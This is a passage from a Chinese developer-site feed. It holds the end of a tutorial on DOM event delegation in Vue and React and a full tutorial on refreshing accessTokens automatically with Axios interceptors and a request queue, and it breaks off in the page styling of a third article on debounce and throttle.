<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">const</span> list = <span class="hljs-title function_">ref</span>([{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'列表项1'</span> }, { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'列表项2'</span> }]);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleListClick</span> = (<span class="hljs-params">e</span>) =&gt; {
  <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'[data-id]'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-keyword">const</span> id = item.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>;
    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'delete-btn'</span>)) {
      list.<span class="hljs-property">value</span> = list.<span class="hljs-property">value</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">id</span> !== <span class="hljs-title class_">Number</span>(id));
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`点击列表项<span class="hljs-subst">${id}</span>`</span>);
    }
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-19">2. React 中的事件委托</h3>
<p>React 的合成事件系统本身就是基于事件委托（所有事件绑定到<code>document</code>），无需手动实现，但可通过<code>e.target</code>判断目标元素：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">List</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [list, setList] = <span class="hljs-title function_">useState</span>([{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'列表项1'</span> }]);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleListClick</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-keyword">const</span> item = e.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'[data-id]'</span>);
    <span class="hljs-keyword">if</span> (item) {
      <span class="hljs-keyword">const</span> id = item.<span class="hljs-property">dataset</span>.<span class="hljs-property">id</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`点击列表项<span class="hljs-subst">${id}</span>`</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleListClick}</span>&gt;</span>
      {list.map(item =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">{item.id}</span>&gt;</span>{item.name}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-20">八、总结</h2>
<p>事件委托是前端开发中 “四两拨千斤” 的技巧，核心是<strong>利用事件冒泡，将多个子元素的事件绑定到父元素，通过目标元素判断执行逻辑</strong>。它的优势在于：</p>
<ul>
<li>减少事件绑定数量，降低内存占用；</li>
<li>天然支持动态元素，无需重复绑定；</li>
<li>简化代码逻辑，提升可维护性。</li>
</ul>
<p>使用时需注意：</p>
<ol>
<li>优先委托到最近的父元素，避免全局委托；</li>
<li>处理嵌套元素用<code>closest</code>，处理不冒泡事件用捕获模式；</li>
<li>高频事件结合节流 / 防抖，及时移除无用事件；</li>
<li>避免随意阻止冒泡，防止委托失效。</li>
</ol>
<p>掌握事件委托，不仅能写出更高效的代码，更能深入理解 DOM 事件流的本质 —— 这也是从 “初级前端” 到 “中高级前端” 的必经之路。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端 Token 刷新机制实战：基于 Axios 的 accessToken 自动续期方案]]></title>    <link>https://juejin.cn/post/7590503651115991090</link>    <guid>https://juejin.cn/post/7590503651115991090</guid>    <pubDate>2026-01-02T07:00:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590503651115991090" data-draft-id="7590011643296694310" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端 Token 刷新机制实战：基于 Axios 的 accessToken 自动续期方案"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-02T07:00:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AntoineGriezmann"/> <meta itemprop="url" content="https://juejin.cn/user/1313259659208356"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端 Token 刷新机制实战：基于 Axios 的 accessToken 自动续期方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1313259659208356/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AntoineGriezmann
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:00:01.000Z" title="Fri Jan 02 2026 07:00:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、背景</h2>
<p>在前后端分离的项目中，前端通常通过 <code>accessToken</code> 来访问业务接口。 但由于 <code>accessToken</code> 有有效期限制，过期后的处理方式，直接影响系统的<strong>安全性</strong>和<strong>用户体验</strong>。</p>
<p>本文将介绍一种 <strong>基于 Axios 响应拦截器 + 请求队列</strong> 的 Token 自动刷新方案，适用于实际生产环境。</p>
<h2 data-id="heading-1">二、整体设计思路</h2>
<p>核心目标只有三个：</p>
<ol>
<li><strong>accessToken 过期时自动刷新</strong></li>
<li><strong>refreshToken 只请求一次</strong></li>
<li><strong>刷新完成后自动重试过期前的请求</strong></li>
</ol>
<p>整体流程如下：</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ead6923e989450e992aff5068cd7470~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW50b2luZUdyaWV6bWFubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767942001&amp;x-signature=DhI3WleSxmSUhPi%2FFbooODJ7BgA%3D" alt="token_FlowChart.png" width="70%" loading="lazy"/>
<h2 data-id="heading-2">三、基于业务 code 的统一错误抛出</h2>
<p>项目中后端返回统一的数据结构：</p>
<pre><code class="hljs language-css" lang="css">{
  <span class="hljs-selector-tag">code</span>:number;
  msg:string;
  data:any
}
</code></pre>
<p>在 Axios 的响应拦截器的 <strong>成功回调</strong> 中：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (code === <span class="hljs-title class_">ApiCodeEnum</span>.<span class="hljs-property">SUCCESS</span>) {
  <span class="hljs-keyword">return</span> data;
}
​
<span class="hljs-comment">// 业务错误，主动抛出</span>
<span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(msg || <span class="hljs-string">"系统出错"</span>);
<span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(msg || <span class="hljs-string">"Error"</span>));
</code></pre>
<ul>
<li>成功流只处理 <strong>真正成功的数据</strong></li>
<li>所有业务异常 <strong>统一进入 error 分支</strong></li>
<li>后续逻辑更清晰、集中</li>
</ul>
<h2 data-id="heading-3">四、在 error 分支中统一处理 Token 异常</h2>
<p>在 Axios 响应拦截器的 error 回调中：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">async</span> (<span class="hljs-keyword">error</span>) =&gt; {
  <span class="hljs-keyword">const</span> { response, config } = <span class="hljs-keyword">error</span>;
​
  <span class="hljs-keyword">if</span> (!response) {
    ElMessage.<span class="hljs-keyword">error</span>(<span class="hljs-string">"网络连接失败"</span>);
    <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-keyword">error</span>);
  }
​
  <span class="hljs-keyword">const</span> { code, msg } = response.data;
​
  switch (code) {
    <span class="hljs-keyword">case</span> ApiCodeEnum.ACCESS_TOKEN_INVALID:
      <span class="hljs-keyword">return</span> refreshTokenAndRetry(config, service);
​
    <span class="hljs-keyword">case</span> ApiCodeEnum.REFRESH_TOKEN_INVALID:
      <span class="hljs-built_in">await</span> redirectToLogin(<span class="hljs-string">"登录已过期"</span>);
      <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-keyword">error</span>);
​
    <span class="hljs-keyword">default</span>:
      ElMessage.<span class="hljs-keyword">error</span>(msg || <span class="hljs-string">"系统出错"</span>);
      <span class="hljs-keyword">return</span> Promise.reject(<span class="hljs-keyword">error</span>);
  }
};
</code></pre>
<h3 data-id="heading-4">设计要点</h3>
<ul>
<li><strong>只在一个地方判断 Token 失效</strong></li>
<li>不在业务代码中关心 Token 状态</li>
</ul>
<h2 data-id="heading-5">五、Token 刷新的难点：并发请求问题</h2>
<p>如果多个接口同时返回 <code>ACCESS_TOKEN_INVALID</code>：</p>
<ul>
<li>❌ 会触发多次 refreshToken 请求</li>
<li>❌ 后端压力大</li>
<li>❌ Token 状态混乱</li>
</ul>
<p><strong>解决方案：请求队列 + 刷新锁</strong></p>
<h2 data-id="heading-6">六、基于闭包的 Token 刷新队列实现</h2>
<p>通过组合式函数 <code>useTokenRefresh</code> 实现：</p>
<h3 data-id="heading-7">核心状态</h3>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">isRefreshingToken</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
const <span class="hljs-attr">pendingRequests</span> = []<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-8">刷新 Token 并重试请求</h3>
<pre><code class="hljs language-ini" lang="ini">async function refreshTokenAndRetry(config, httpRequest) {
  return new Promise((resolve, reject) =&gt; {
    const <span class="hljs-attr">retryRequest</span> = () =&gt; {
      const <span class="hljs-attr">newToken</span> = AuthStorage.getAccessToken()<span class="hljs-comment">;</span>
      <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${newToken}</span>`<span class="hljs-comment">;</span>
      httpRequest(config).then(resolve).catch(reject)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
​
    pendingRequests.push({ resolve, reject, retryRequest })<span class="hljs-comment">;</span>
​
    if (!isRefreshingToken) {
      <span class="hljs-attr">isRefreshingToken</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
​
      useUserStoreHook()
        .refreshToken()
        .then(() =&gt; {
          pendingRequests.forEach(<span class="hljs-attr">req</span> =&gt; req.retryRequest())<span class="hljs-comment">;</span>
          <span class="hljs-attr">pendingRequests.length</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        })
        .catch(async () =&gt; {
          pendingRequests.forEach(<span class="hljs-attr">req</span> =&gt;
            req.reject(new Error("Token refresh failed"))
          )<span class="hljs-comment">;</span>
          <span class="hljs-attr">pendingRequests.length</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
          await redirectToLogin("登录已失效")<span class="hljs-comment">;</span>
        })
        .finally(() =&gt; {
          <span class="hljs-attr">isRefreshingToken</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
        })<span class="hljs-comment">;</span>
    }
  })<span class="hljs-comment">;</span>
}
</code></pre>
<h2 data-id="heading-9">七、为什么要提前初始化刷新函数？</h2>
<blockquote>
<p>在创建 Axios 函数中要提前初始化刷新函数</p>
</blockquote>
<pre><code class="hljs language-scss" lang="scss">const { refreshTokenAndRetry } = <span class="hljs-built_in">useTokenRefresh</span>();
</code></pre>
<h3 data-id="heading-10">原因</h3>
<ul>
<li>
<p>利用 <strong>闭包</strong> 保存刷新状态</p>
</li>
<li>
<p>确保所有请求共享：</p>
<ul>
<li><code>isRefreshingToken</code></li>
<li><code>pendingRequests</code></li>
</ul>
</li>
<li>
<p>防止重复刷新</p>
</li>
</ul>
<h2 data-id="heading-11">完整代码示例</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">InternalAxiosRequestConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"axios"</span>;
<span class="hljs-keyword">import</span> { useUserStoreHook } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/store/modules/user.store"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AuthStorage</span>, redirectToLogin } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils/auth"</span>;
​
<span class="hljs-comment">/**
 * 等待请求的类型接口
 */</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">PendingRequest</span> = {
  <span class="hljs-attr">resolve</span>: <span class="hljs-function">(<span class="hljs-params">_value: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-attr">reject</span>: <span class="hljs-function">(<span class="hljs-params">_reason?: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  <span class="hljs-attr">retryRequest</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;
};
​
<span class="hljs-comment">/**
 * Token刷新组合式函数
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useTokenRefresh</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// Token 刷新相关状态s</span>
  <span class="hljs-keyword">let</span> isRefreshingToken = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> <span class="hljs-attr">pendingRequests</span>: <span class="hljs-title class_">PendingRequest</span>[] = [];
​
  <span class="hljs-comment">/**
   * 刷新 Token 并重试请求
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">refreshTokenAndRetry</span>(<span class="hljs-params">
    config: InternalAxiosRequestConfig,
    httpRequest: <span class="hljs-built_in">any</span>
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-comment">// 封装需要重试的请求</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">retryRequest</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">const</span> newToken = <span class="hljs-title class_">AuthStorage</span>.<span class="hljs-title function_">getAccessToken</span>();
        <span class="hljs-keyword">if</span> (newToken &amp;&amp; config.<span class="hljs-property">headers</span>) {
          config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${newToken}</span>`</span>;
        }
        <span class="hljs-title function_">httpRequest</span>(config).<span class="hljs-title function_">then</span>(resolve).<span class="hljs-title function_">catch</span>(reject);
      };
​
      <span class="hljs-comment">// 将请求加入等待队列</span>
      pendingRequests.<span class="hljs-title function_">push</span>({ resolve, reject, retryRequest });
​
      <span class="hljs-comment">// 如果没有正在刷新，则开始刷新流程</span>
      <span class="hljs-keyword">if</span> (!isRefreshingToken) {
        isRefreshingToken = <span class="hljs-literal">true</span>;
​
        <span class="hljs-title function_">useUserStoreHook</span>()
          .<span class="hljs-title function_">refreshToken</span>()
          .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-comment">// 刷新成功，重试所有等待的请求</span>
            pendingRequests.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">request</span>) =&gt;</span> {
              <span class="hljs-keyword">try</span> {
                request.<span class="hljs-title function_">retryRequest</span>();
              } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Retry request error:"</span>, error);
                request.<span class="hljs-title function_">reject</span>(error);
              }
            });
            <span class="hljs-comment">// 清空队列</span>
            pendingRequests.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
          })
          .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">async</span> (error) =&gt; {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Token refresh failed:"</span>, error);
            <span class="hljs-comment">// 刷新失败，先 reject 所有等待的请求，再清空队列</span>
            <span class="hljs-keyword">const</span> failedRequests = [...pendingRequests];
            pendingRequests.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>;
​
            <span class="hljs-comment">// 拒绝所有等待的请求</span>
            failedRequests.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">request</span>) =&gt;</span> {
              request.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Token refresh failed"</span>));
            });
​
            <span class="hljs-comment">// 跳转登录页</span>
            <span class="hljs-keyword">await</span> <span class="hljs-title function_">redirectToLogin</span>(<span class="hljs-string">"登录状态已失效，请重新登录"</span>);
          })
          .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
            isRefreshingToken = <span class="hljs-literal">false</span>;
          });
      }
    });
  }
​
  <span class="hljs-keyword">return</span> {
    refreshTokenAndRetry,
  };
}
​
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从定时器管理出发，彻底搞懂防抖与节流的实现逻辑]]></title>    <link>https://juejin.cn/post/7590071125398192168</link>    <guid>https://juejin.cn/post/7590071125398192168</guid>    <pubDate>2026-01-02T07:01:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398192168" data-draft-id="7589978645135753226" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从定时器管理出发，彻底搞懂防抖与节流的实现逻辑"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-02T07:01:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烟袅破辰"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从定时器管理出发，彻底搞懂防抖与节流的实现逻辑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烟袅破辰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:01:17.000Z" title="Fri Jan 02 2026 07:01:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body 